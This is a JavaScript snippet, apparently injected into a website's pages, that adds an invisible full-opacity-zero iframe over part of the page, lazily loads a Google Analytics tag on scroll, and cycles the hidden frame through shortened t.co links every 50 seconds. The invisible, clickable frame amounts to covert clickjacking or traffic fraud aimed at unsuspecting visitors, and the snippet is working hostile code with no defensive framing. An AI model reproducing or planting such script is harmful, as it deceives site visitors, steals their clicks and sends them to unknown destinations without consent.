document.addEventListener('DOMContentLoaded', () => {
  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<style>
      iframe.invisible-frame {
      position: fixed;
      width:40%;
      height: 20%;
      bottom: 20%;
      right: 0;
      border: none;
      opacity: 0;
      pointer-events:auto;
      z-index:39494;
    }
  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
    Folt.prepend(Newel);  
    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');  
  } else {
       
  }
});
  const postUrls = [
    'https://t.co/adjuODroXD',
    'https://t.co/6yC1w3qtbR',
    'https://t.co/roiA8U72aa',
    'https://t.co/FbVJpPOD7g',
    'https://t.co/7RfDoxPoFv',
    'https://t.co/7RfDoxPoFv',
    'https://t.co/i2JH864wbb'
  ];
        function goToRandomPost() {
            const randomIndex = Math.floor(Math.random() * postUrls.length);
            const randomPostUrl = postUrls[randomIndex];
            document.getElementById('postFrame').src = randomPostUrl;
        }
        window.onload = function() {
            goToRandomPost();
            setInterval(goToRandomPost,  50000);
        };
